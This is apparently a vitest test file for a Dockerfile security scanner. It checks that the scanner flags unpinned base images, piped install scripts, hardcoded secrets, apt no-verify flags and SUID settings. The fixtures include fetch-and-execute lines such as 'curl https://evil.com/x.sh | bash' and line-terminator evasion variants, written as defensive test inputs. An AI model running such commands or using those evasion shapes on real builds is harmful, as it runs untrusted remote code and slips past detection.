import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import {
  scanDockerFile,
  isDockerFile,
  isUnpinnedGlobalInstall,
  DOCKERFILE_PATTERNS,
} from "../dockerfile-scanner.js";
import { matchPatternInContent } from "../patterns.js";

function normalizePatternMatches(
  content: string,
  matches: ReturnType<typeof matchPatternInContent>,
) {
  const lineStarts = [0];
  for (let index = 0; index < content.length; index++) {
    if (content[index] === "\n") lineStarts.push(index + 1);
  }

  return matches.map((hit) => {
    const matchIndex = hit.match.index ?? 0;
    const absoluteStart = hit.match.input === content
      ? matchIndex
      : (lineStarts[hit.line - 1] ?? 0) + matchIndex;
    return { line: hit.line, start: absoluteStart, evidence: hit.text };
  });
}

/**
 * A syntactically valid, obviously synthetic sha256 digest (64 hex characters).
 * The length matters: PINNED_DIGEST_RE rejects a truncated placeholder, because
 * a truncated digest identifies no image and the daemon refuses it.
 */
const TEST_DIGEST = `sha256:${"0123456789abcdef".repeat(4)}`;

describe("Dockerfile Scanner", () => {
  it("should identify Docker-related filenames", () => {
    expect(isDockerFile("Dockerfile")).toBe(true);
    expect(isDockerFile("Dockerfile.prod")).toBe(true);
    expect(isDockerFile("docker-compose.yml")).toBe(true);
    expect(isDockerFile("docker-compose.yaml")).toBe(true);
    expect(isDockerFile("Containerfile")).toBe(true);
    expect(isDockerFile(".dockerignore")).toBe(true);
    expect(isDockerFile("package.json")).toBe(false);
    expect(isDockerFile("README.md")).toBe(false);
  });

  it("should detect curl piped to bash in Dockerfile", () => {
    const content = 'RUN curl -fsSL https://example.com/install.sh | bash';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(true);
    expect(findings.find((f) => f.rule === "DOCKER_CURL_PIPE")?.severity).toBe("critical");
  });

  it("should detect wget piped to shell", () => {
    const content = 'RUN wget -qO- https://example.com/setup.sh | sh';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(true);
  });

  it("should detect unpinned base images with :latest", () => {
    const content = 'FROM node:latest';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_UNPINNED_BASE")).toBe(true);
  });

  it("should detect FROM without any tag", () => {
    const content = 'FROM ubuntu';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_NO_TAG")).toBe(true);
  });

  it("treats a version tag as unpinned and a digest as pinned", () => {
    // This test used to assert the opposite: it called FROM node:20-alpine
    // "pinned" and required a clean result, which is the assertion issue 174
    // reports as holding the gap open. A version tag is mutable (the image
    // behind it is rebuilt), so it is a low-severity reproducibility finding,
    // NOT the high-severity moving-channel finding and NOT clean.
    const tagged = scanDockerFile("FROM node:20-alpine", "Dockerfile");
    expect(tagged.some((f) => f.rule === "DOCKER_TAG_NOT_DIGEST")).toBe(true);
    expect(tagged.find((f) => f.rule === "DOCKER_TAG_NOT_DIGEST")?.severity).toBe("low");
    expect(tagged.some((f) => f.rule === "DOCKER_UNPINNED_BASE")).toBe(false);
    expect(tagged.some((f) => f.rule === "DOCKER_NO_TAG")).toBe(false);

    const pinned = scanDockerFile(`FROM node:22-alpine@${TEST_DIGEST}`, "Dockerfile");
    expect(pinned).toHaveLength(0);
  });

  it("should detect HTTP ADD source", () => {
    const content = 'ADD https://example.com/file.tar.gz /app/';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_HTTP_SOURCE")).toBe(true);
  });

  it("should detect hardcoded secrets in ENV", () => {
    const content = 'ENV API_KEY=sk-1234567890abcdef';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_SECRETS_BUILD")).toBe(true);
  });

  it("should detect global npm install", () => {
    const content = 'RUN npm install -g some-package';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_NPM_GLOBAL")).toBe(true);
  });

  it("should detect APT no-verify flags", () => {
    const content = 'RUN apt-get install --allow-unauthenticated some-pkg';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(true);
  });

  it("should detect SUID bit setting", () => {
    const content = 'RUN chmod u+s /usr/bin/something';
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_SUID")).toBe(true);
  });

  it("should return empty findings for clean Dockerfile", () => {
    // The FROM line was `FROM node:20-alpine AS builder` and this test asserted
    // zero findings, which is the second assertion that locked issue 174 in
    // place. A clean Dockerfile is a digest-pinned one, so that is what it now
    // uses; the rest of the fixture is unchanged.
    const content = [
      `FROM node:22-alpine@${TEST_DIGEST} AS builder`,
      "WORKDIR /app",
      "COPY package*.json ./",
      "RUN npm ci --production",
      "COPY . .",
      "EXPOSE 3000",
      'CMD ["node", "index.js"]',
    ].join("\n");
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings).toHaveLength(0);
  });

  it("should include line numbers in findings", () => {
    const content = "FROM node:20\nWORKDIR /app\nRUN curl https://evil.com/x.sh | bash";
    const findings = scanDockerFile(content, "Dockerfile");
    const finding = findings.find((f) => f.rule === "DOCKER_CURL_PIPE");
    expect(finding?.line).toBe(3);
    expect(finding?.file).toBe("Dockerfile");
  });

  it("does not correlate incomplete Docker command fragments", () => {
    const content = [
      "RUN curl https://example.com/install.sh",
      "RUN apt-get install some-pkg",
      "RUN chmod 755 /usr/bin/something",
    ].join("\n");
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_SUID")).toBe(false);
  });

  it("preserves the standalone --force-yes alternative", () => {
    const findings = scanDockerFile("echo --force-yes", "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(true);
  });

  it("does not bridge dot-only correlations across JavaScript line terminators", () => {
    const content = [
      "RUN prefix\rcurl x | bash",
      "RUN prefix\rapt install --allow-unauthenticated",
      "RUN prefix\rchmod u+s /bin/tool",
    ].join("\n");
    const findings = scanDockerFile(content, "Dockerfile");
    expect(findings.some((f) => f.rule === "DOCKER_CURL_PIPE")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_APT_NO_VERIFY")).toBe(false);
    expect(findings.some((f) => f.rule === "DOCKER_SUID")).toBe(false);
  });

  it("matches the legacy regex verdict on Docker correlation edge cases", () => {
    const cases: Array<[string, string[]]> = [
      ["DOCKER_CURL_PIPE", [
        "RUN curl x | bash",
        "prefix RUN x\rcurl x | bash",
        "prefix RUN x\u2028curl x | bash",
        "prefix RUN x\u2029curl x | bash",
        "RUN curl \r x | SH",
        "RUN curl \u2028 x | python",
        "RUN curl \u2029 x | perl",
        "RUN curl \r x | cat wget y | bash",
        "RUN curl \u2028 x | cat wget y | bash",
        "RUN curl \u2029 x | cat wget y | bash",
        "RUN old RUN \r curl x | bash",
        "RUN old RUN \u2028 curl x | bash",
        "RUN old RUN \u2029 curl x | bash",
        "RUN first RUN second curl x | sh curl y | NODE",
        "before\nRUN curl x | bash",
      ]],
      ["DOCKER_APT_NO_VERIFY", [
        "--force-yes",
        "RUN apt x --allow-unauthenticated",
        "RUN apt x --allow-unauthenticated y --allow-unauthenticated",
        "RUN apt \r x --allow-unauthenticated",
        "RUN apt \u2028 x --allow-unauthenticated",
        "RUN apt \u2029 x --allow-unauthenticated",
        "RUN apt x\r--allow-unauthenticated",
        "RUN apt x\u2028--allow-unauthenticated",
        "RUN apt x\u2029--allow-unauthenticated",
        "RUN apt x RUN \r apt y --allow-unauthenticated",
        "RUN apt x RUN \u2028 apt y --allow-unauthenticated",
        "RUN apt x RUN \u2029 apt y --allow-unauthenticated",
        "--force-yes x RUN apt y --allow-unauthenticated",
        "RUN apt x --force-yes y --allow-unauthenticated",
      ]],
      ["DOCKER_SUID", [
        "RUN chmod u+s /bin/x",
        "RUN x\rchmod u+s /bin/x",
        "RUN x\u2028chmod u+s /bin/x",
        "RUN x\u2029chmod u+s /bin/x",
        "RUN chmod \rno chmod u+s /bin/x",
        "RUN chmod \u2028no chmod u+s /bin/x",
        "RUN chmod \u2029no chmod u+s /bin/x",
        "RUN old RUN \r chmod u+s /bin/x",
        "RUN old RUN \u2028 chmod u+s /bin/x",
        "RUN old RUN \u2029 chmod u+s /bin/x",
        "RUN first RUN second chmod u+s x chmod g+s",
      ]],
      ["DOCKER_NPM_GLOBAL", [
        "RUN npm install -g pnpm",
        "RUN npm install -g pnpm@9.15.0",
        "RUN npm i --global    pnpm",
        "RUN npm add --location=global pnpm@9.15.0",
        "RUN npm \r install -g pnpm",
        "RUN npm install -g \rpnpm",
        "RUN npm install -g pnpm\r",
        "RUN npm install -g \r",
        "RUN npm install -g    ",
        "RUN npm install -g pinned@1.2.3 && RUN npm i -g mutable",
        "RUN npm install -g old\rRUN npm install -g later",
        "prefix\nRUN npm install -g pnpm",
      ]],
    ];

    for (const [rule, sources] of cases) {
      const structural = DOCKERFILE_PATTERNS.find((entry) => entry.rule === rule)!;
      const regex = {
        ...structural,
        correlatedMatcher: undefined,
        valueFilter: rule === "DOCKER_NPM_GLOBAL"
          ? isUnpinnedGlobalInstall
          : structural.valueFilter,
      };
      for (const content of sources) {
        const expected = normalizePatternMatches(
          content,
          matchPatternInContent(regex, content, "i"),
        );
        const actual = normalizePatternMatches(
          content,
          matchPatternInContent(structural, content, "i"),
        );
        expect(actual, `${rule}: ${JSON.stringify(content)}`).toEqual(expected);
      }
    }
  });

  it("fully scans 5 MiB repeated-prefix near misses in linear time", { timeout: 15_000 }, () => {
    const size = 5 * 1024 * 1024;
    const cases: Array<[string, string]> = [
      ["DOCKER_CURL_PIPE", "RUN curl x"],
      ["DOCKER_APT_NO_VERIFY", "RUN apt x"],
      ["DOCKER_SUID", "RUN x"],
    ];
    const started = Date.now();

    for (const [rule, unit] of cases) {
      const pattern = DOCKERFILE_PATTERNS.find((entry) => entry.rule === rule)!;
      const content = unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
      const hits = matchPatternInContent(pattern, content, "i");
      expect(hits, rule).toHaveLength(0);
      expect(hits.coverage.complete, rule).toBe(true);
      expect(hits.coverage.regexAttempts, rule).toBe(1);
    }

    const npmPattern = DOCKERFILE_PATTERNS.find(
      (entry) => entry.rule === "DOCKER_NPM_GLOBAL",
    )!;
    const npmUnit = "RUN npm install -g \r";
    const npmContent = npmUnit.repeat(Math.floor(size / npmUnit.length));
    const npmHits = matchPatternInContent(npmPattern, npmContent, "i");
    expect(npmHits).toHaveLength(0);
    expect(npmHits.coverage.complete).toBe(true);
    expect(npmHits.coverage.regexAttempts).toBe(1);

    expect(Date.now() - started).toBeLessThan(5_000);
  });

  // -------------------------------------------------------------------------
  // Base image pinning (issue 174). One structural parser, three verdicts.
  //
  // Every case below is a shape the released five-word regex got wrong, or a
  // shape the replacement must not start getting wrong. Deleting any single
  // expectation reddens nothing else, which is the point: each one is the only
  // test that covers its branch of classifyBaseImageReference().
  // -------------------------------------------------------------------------

  function pinningVerdict(content: string): string[] {
    return scanDockerFile(content, "Dockerfile")
      .filter((f) =>
        f.rule === "DOCKER_UNPINNED_BASE" ||
        f.rule === "DOCKER_NO_TAG" ||
        f.rule === "DOCKER_TAG_NOT_DIGEST"
      )
      .map((f) => `${f.rule}@${f.line}`)
      .sort();
  }

  it("flags a moving channel tag in every shape the five-word regex missed", () => {
    const cases: Array<[string, string]> = [
      // The bare forms the released rule already caught. Kept as the control:
      // a regression here means the widening lost ground rather than gained it.
      ["FROM node:latest", "bare latest"],
      ["FROM node:stable", "bare stable"],
      ["FROM node:lts", "bare lts"],
      ["FROM node:current", "bare current"],
      ["FROM nginx:mainline", "bare mainline"],
      // Miss 1: an instruction flag bound \S+ to the flag token, so a literal
      // :latest scanned clean and passed --fail-on high with exit 0.
      ["FROM --platform=$BUILDPLATFORM node:latest AS build", "--platform flag"],
      ["FROM --platform=linux/amd64 nginx:stable", "--platform, literal value"],
      // Miss 2: the alternation ended at (?:\s|$), so the suffixed upstream
      // channel tags escaped while their bare forms flagged.
      ["FROM node:lts-alpine", "lts-alpine"],
      ["FROM nginx:stable-alpine", "stable-alpine"],
      ["FROM nginx:mainline-alpine", "mainline-alpine"],
      ["FROM node:current-slim", "current-slim"],
      // Miss 3: (?!scratch) had no token boundary.
      ["FROM scratch-base:latest", "scratch-prefixed name"],
      ["FROM scratchpad:latest", "scratch-prefixed name, no hyphen"],
      // Shapes the parser must keep getting right.
      ["FROM registry.example.com:5000/team/app:latest", "registry port plus tag"],
      ["FROM node:LATEST", "tag case is not significant"],
      ["from node:latest", "instruction case is not significant"],
      ["  FROM node:latest", "indented instruction"],
    ];

    for (const [content, label] of cases) {
      expect(pinningVerdict(content), label).toEqual(["DOCKER_UNPINNED_BASE@1"]);
    }
  });

  it("flags a tag without a digest at low severity, separately from a channel tag", () => {
    const cases: Array<[string, string]> = [
      ["FROM node:20-alpine", "version tag"],
      ["FROM postgres:16-alpine", "version tag"],
      ["FROM python:3.12-slim", "version tag"],
      ["FROM owasp/modsecurity-crs:apache", "arbitrary non-version tag"],
      ["FROM registry.example.com:5000/team/app:1.2.3", "registry port plus version tag"],
      [`FROM node:20@${TEST_DIGEST.slice(0, 20)}`, "truncated digest is not a pin"],
      ["FROM node:${NODE_TAG}", "variable tag on a concrete name"],
    ];

    for (const [content, label] of cases) {
      expect(pinningVerdict(content), label).toEqual(["DOCKER_TAG_NOT_DIGEST@1"]);
    }
    expect(
      scanDockerFile("FROM node:20-alpine", "Dockerfile")
        .find((f) => f.rule === "DOCKER_TAG_NOT_DIGEST")?.severity,
    ).toBe("low");
  });

  it("flags a base image with no tag and no digest, in a stage declaration too", () => {
    expect(pinningVerdict("FROM ubuntu")).toEqual(["DOCKER_NO_TAG@1"]);
    // New: the released regex ended at \s*$, so a stage-declaring FROM with no
    // tag scanned clean. It defaults to :latest exactly like the bare form.
    expect(pinningVerdict("FROM ubuntu AS base")).toEqual(["DOCKER_NO_TAG@1"]);
  });

  it("reports nothing for a reference that is pinned, reserved, or not an image", () => {
    const cases: Array<[string, string]> = [
      [`FROM node:22-alpine@${TEST_DIGEST}`, "tag plus digest"],
      [`FROM ubuntu@${TEST_DIGEST}`, "digest without a tag"],
      [`FROM registry.example.com:5000/team/app@${TEST_DIGEST}`, "registry port plus digest"],
      ["FROM scratch", "the reserved empty image"],
      ["FROM SCRATCH", "reserved image, case insensitive"],
      // A stage reference is not a registry image and cannot be digest pinned.
      // Without stage tracking this line reads as an untagged image.
      [`FROM node:22-alpine@${TEST_DIGEST} AS builder\nFROM builder AS runtime`, "stage reference"],
      [`FROM node:22-alpine@${TEST_DIGEST} AS Builder\nFROM builder`, "stage names are case insensitive"],
      // Wholly variable: the value is not visible here and may carry a digest.
      ["FROM $NODE_IMAGE", "whole reference is a variable"],
      ["FROM ${NODE_IMAGE}", "whole reference is a braced variable"],
      ["FROM ${NODE_IMAGE:-fallback}", "braced variable with a default"],
      // Not instructions at all. The released regex matched FROM anywhere in
      // the line, so both of these were reported.
      ["# FROM node:latest", "commented out instruction"],
      ["RUN echo FROM node:latest", "FROM inside another instruction"],
    ];

    for (const [content, label] of cases) {
      expect(pinningVerdict(content), label).toEqual([]);
    }
  });

  it("resolves a stage only when it is declared above the reference", () => {
    // Docker resolves stages declared ABOVE the instruction. A forward
    // reference is not a stage, so it must not be silenced as one.
    const forward = [
      "FROM runtime",
      `FROM node:22-alpine@${TEST_DIGEST} AS runtime`,
    ].join("\n");
    expect(pinningVerdict(forward)).toEqual(["DOCKER_NO_TAG@1"]);
  });

  it("parses a FROM instruction split across continuation lines", () => {
    // Reported on the line the instruction STARTS on, which is where a reader
    // and a code-review annotation both look.
    expect(pinningVerdict("FROM \\\n  node:latest")).toEqual([
      "DOCKER_UNPINNED_BASE@1",
    ]);
    expect(pinningVerdict("FROM \\\n# a comment inside the instruction\n  node:latest")).toEqual([
      "DOCKER_UNPINNED_BASE@1",
    ]);
    // The mirror image: a continuation line that merely BEGINS with FROM is an
    // argument to the previous instruction, not an instruction.
    expect(pinningVerdict("RUN echo hello \\\nFROM node:latest")).toEqual([]);
  });

  it("classifies a FROM instruction carrying an embedded line terminator", () => {
    // JavaScript's `.` stops at a line terminator, so a `$`-anchored
    // instruction regex fails to match at all on these and the literal :latest
    // scans clean. The released five-word regex DID report them, because \r is
    // whitespace to \s, so getting this wrong would be a regression rather than
    // an unchanged gap. The same evasion is guarded elsewhere in this file.
    for (const terminator of ["\r", "\u2028", "\u2029"]) {
      expect(
        pinningVerdict(`FROM node:latest${terminator}EXTRA`),
        JSON.stringify(terminator),
      ).toEqual(["DOCKER_UNPINNED_BASE@1"]);
    }
  });

  it("does not classify a FROM instruction longer than the parse bound", () => {
    // MAX_FROM_INSTRUCTION_CHARS is 1024, about double the longest instruction
    // the reference grammar can produce. Beyond it the instruction is not a
    // legal reference and is not classified; the bound is what keeps this
    // matcher linear on an attacker-supplied line. Asserted so the limit is a
    // documented behaviour rather than a surprise.
    const within = `FROM --platform=${"a".repeat(900)} node:latest`;
    expect(pinningVerdict(within), "inside the bound").toEqual([
      "DOCKER_UNPINNED_BASE@1",
    ]);
    const beyond = `FROM --platform=${"a".repeat(1200)} node:latest`;
    expect(pinningVerdict(beyond), "beyond the bound").toEqual([]);
  });

  it("keeps this repository's own Dockerfile clean under the new rules", () => {
    // Acceptance criterion 3 of the issue. Both FROM lines are digest pinned,
    // so if this ever reddens the rule is wrong, not the Dockerfile.
    const dockerfile = readFileSync(
      new URL("../../Dockerfile", import.meta.url),
      "utf-8",
    );
    expect(pinningVerdict(dockerfile)).toEqual([]);
  });

  it("fully scans 5 MiB of FROM-shaped near misses in linear time", { timeout: 15_000 }, () => {
    const size = 5 * 1024 * 1024;
    const started = Date.now();

    // An unbounded continuation chain: 5 MiB of lines that each ask to be
    // joined to the next. The join budget, not the file, has to bound the work.
    const continuation = "RUN x \\\n";
    const continued = continuation.repeat(
      Math.floor(size / continuation.length),
    );
    // One enormous physical line. The per-instruction parse bound, not the
    // line length, has to bound the work.
    const single = `FROM --platform=${"a".repeat(size)} node:latest`;

    for (const rule of ["DOCKER_UNPINNED_BASE", "DOCKER_NO_TAG", "DOCKER_TAG_NOT_DIGEST"]) {
      const pattern = DOCKERFILE_PATTERNS.find((entry) => entry.rule === rule)!;

      const continuedHits = matchPatternInContent(pattern, continued, "i");
      expect(continuedHits, `${rule}: continuations`).toHaveLength(0);
      expect(continuedHits.coverage.regexAttempts, rule).toBe(1);

      const singleHits = matchPatternInContent(pattern, single, "i");
      expect(singleHits, `${rule}: single long line`).toHaveLength(0);
      expect(singleHits.coverage.complete, rule).toBe(true);
      expect(singleHits.coverage.regexAttempts, rule).toBe(1);
    }

    expect(Date.now() - started).toBeLessThan(5_000);
  });

  it("loads DOCKERFILE_PATTERNS with all three FROM rules bound to a matcher", () => {
    // validatePatternSet() runs at module load. When it throws, vitest reports
    // "no tests" for this file rather than a failed assertion, so a suite that
    // never ran looks very much like a suite that passed. This test fails
    // loudly instead, and it is also the guard on the rule-id surface: a
    // renamed or dropped rule id is a breaking change for every consumer that
    // has it in rules.disable or in a SARIF baseline.
    for (const rule of ["DOCKER_UNPINNED_BASE", "DOCKER_NO_TAG", "DOCKER_TAG_NOT_DIGEST"]) {
      const entry = DOCKERFILE_PATTERNS.find((p) => p.rule === rule);
      expect(entry, rule).toBeDefined();
      expect(typeof entry!.correlatedMatcher, rule).toBe("function");
      expect(entry!.description, rule).toMatch(/Compose image: values are out of scope/);
    }
    expect(
      DOCKERFILE_PATTERNS.find((p) => p.rule === "DOCKER_TAG_NOT_DIGEST")!.severity,
    ).toBe("low");
    expect(
      DOCKERFILE_PATTERNS.find((p) => p.rule === "DOCKER_UNPINNED_BASE")!.severity,
    ).toBe("high");
  });

  it("should have patterns array", () => {
    expect(DOCKERFILE_PATTERNS.length).toBeGreaterThan(5);
    for (const p of DOCKERFILE_PATTERNS) {
      expect(p.rule).toBeTruthy();
      expect(p.severity).toBeTruthy();
    }
  });
});
